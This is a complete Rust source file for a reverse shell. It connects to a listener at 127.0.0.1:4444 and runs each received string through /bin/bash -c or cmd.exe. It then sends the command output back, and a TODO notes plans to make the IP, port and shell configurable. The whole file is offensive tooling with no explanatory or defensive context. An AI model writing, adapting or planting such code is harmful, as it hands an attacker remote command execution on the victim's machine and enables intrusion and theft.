use std::str;
use std::env::consts::OS;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

// TODO: cmdline args for IP PORT and SHELL


struct CMD {
    shell: String,
    arg: String,
}


fn main() {
    let mut stream = TcpStream::connect("127.0.0.1:4444")
                                .expect("Couldn't connect to the server...");
    let cmd = match OS {
                "linux" => CMD {shell: "/bin/bash".to_string(), arg: "-c".to_string()},
                "windows" => CMD {shell: "cmd.exe".to_string(), arg: "".to_string()},
                _ => panic!("No shell for this OS"),
    };
    loop {
        let mut buf: [u8; 1024] = [32; 1024];
        if let 0 = stream.read(&mut buf).expect("Error"){
            break;
        } else {
            let output = Command::new(&cmd.shell)
                                .arg(&cmd.arg)
                                .arg(str::from_utf8(&buf).unwrap())
                                .output()
                                .expect("failed to execute process");
            stream.write(&output.stdout).expect("Error writing");
        };
    }

}
